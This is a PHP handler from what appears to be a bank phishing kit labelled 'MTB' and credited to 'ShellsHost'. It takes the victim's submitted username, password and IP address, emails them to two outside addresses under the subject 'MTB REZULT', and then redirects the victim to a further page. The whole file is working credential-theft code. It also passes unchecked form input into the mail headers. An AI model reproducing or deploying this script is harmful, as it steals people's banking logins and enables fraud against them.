<?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ MTB Info +--------------\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By ShellsHost-----------------\n";
$send = "resulttest2@aol.com,resulttest2@yahoo.com";
$subject = "MTB REZULT [ $ip ]";
$headers = "From: Mtb<logs@shellshost.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
?>
<script>
    window.top.location.href = "email.htm";

</script>s